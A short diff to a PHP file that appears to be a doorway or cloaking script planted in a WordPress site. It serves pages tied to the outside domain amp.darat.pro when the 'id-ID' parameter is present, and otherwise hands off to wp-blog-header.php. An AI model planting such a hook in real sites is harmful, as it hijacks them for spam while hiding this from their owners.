@@ -9,7 +9,7 @@ if (isset($_GET['id-ID']) && !empty($_GET['id-ID'])) {
     $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
     $ampnya = "https://amp.darat.pro/global/" . strtolower($page);
 } else {
-    include __DIR__ . "/main.php"; 
+    include __DIR__ . "/wp-blog-header.php"; 
     exit;
 }
 ?>
@@ -1914,4 +1914,5 @@ window.datadog_attributes['pageType']='item:details'
     //]]>
   </script>
 </body>
+
 </html>
